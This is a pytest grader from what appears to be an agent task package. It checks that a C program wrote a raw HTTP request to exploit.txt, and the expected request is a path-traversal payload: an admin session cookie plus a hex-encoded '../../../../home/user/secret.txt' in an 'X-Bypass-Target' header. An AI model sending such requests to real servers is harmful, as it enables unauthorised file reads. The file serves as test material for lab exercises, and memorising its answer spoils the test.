# test_final_state.py

import os
import pytest
import binascii

def test_exploit_file_exists():
    """Test that the exploit.txt file was generated."""
    exploit_path = "/home/user/exploit.txt"
    assert os.path.isfile(exploit_path), f"File not found: {exploit_path}. The C program must write the output to this file."

def test_exploit_file_content():
    """Test that the exploit.txt file contains the correctly constructed HTTP request."""
    exploit_path = "/home/user/exploit.txt"
    assert os.path.isfile(exploit_path), f"File not found: {exploit_path}."

    with open(exploit_path, "rb") as f:
        actual_content = f.read()

    # Derive the expected payload
    target_path = "../../../../home/user/secret.txt"
    hex_encoded_path = binascii.hexlify(target_path.encode('utf-8')).decode('utf-8')
    session_token = "adm_8f7e6d5c4b"
    custom_header = "X-Bypass-Target"

    expected_lines = [
        "GET /download HTTP/1.1",
        "Host: localhost",
        f"Cookie: session_token={session_token}",
        f"{custom_header}: {hex_encoded_path}",
        ""
    ]

    expected_content = "\r\n".join(expected_lines).encode('utf-8') + b"\r\n"

    assert actual_content == expected_content, (
        "The content of exploit.txt does not match the expected raw HTTP request.\n"
        "Ensure you are using CRLF (\\r\\n) for line endings, the correct encoded path, "
        "the correct custom header, and the admin session token."
    )